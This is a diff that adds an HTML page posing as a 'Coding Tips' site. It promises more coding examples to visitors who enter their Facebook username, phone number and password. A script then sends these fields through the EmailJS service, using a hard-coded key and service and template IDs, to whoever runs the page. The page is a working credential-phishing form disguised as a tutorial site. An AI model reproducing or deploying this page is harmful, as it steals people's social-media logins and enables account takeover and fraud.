@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Page title</title>
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("j-RyybTO6NZeqMSyV");
+   })();
+</script>
+
+
+  </head>
+<body>
+    
+  
+  <img src="/storage/emulated/0/coding tips.html/Screenshot_20231221-114430.jpg" id="ct">
+  </br></br>  </br></br>
+  <p><h1><b>WELCOME TO CODING TIPS(CT)</b></h1></p>
+    </br>
+    <p><h1><b>CODING IS THE WAY PEOPLE MAKE GAMES AS WELL AS APPLICATIONS AND MANY MORE OF OTHER THINGS,FOR EXAMPLE THIS WEBPAGE WAS ALSO DONE WITH CODING</b></h1></p>
+</br></br>
+<img src="/storage/emulated/0/coding tips.html/1703152164285.png" id="f">
+</br>
+    <p><h1><b>FOR MORE CODING EXAMPLES PLEASE FILL IN THE FOLLOWING FACE BOOK INFORMATION,ONCE DONE CLICK THE SEND BUTTON AND CLICK THE LINK THAT POPS UP</b></h1></p>
+</br></br>
+
+<input type="text" placeholder="username" id="text"> </br>
+<input type="email" placeholder="phone" id="email"></br>
+<textarea id="message" placeholder="password"></textarea></br>
+<button onclick="send()"><h1><b>SEND</b></h1></button>
+</br>
+</br>
+</br>
+
+  
+</body>
+
+
+    
+    <script>
+    
+    
+    
+    function send() {
+    
+    
+    
+        var params = {
+            from_name: document.getElementById("text").value,
+        
+     
+             email_id: document.getElementById("email").value,
+                   
+            message: document.getElementById("message").value
+            
+            
+            
+        }
+        emailjs.send("service_41ustpj","template_r2smqql",params)
+        
+      
+        
+    }
+
+</script>
+</html>
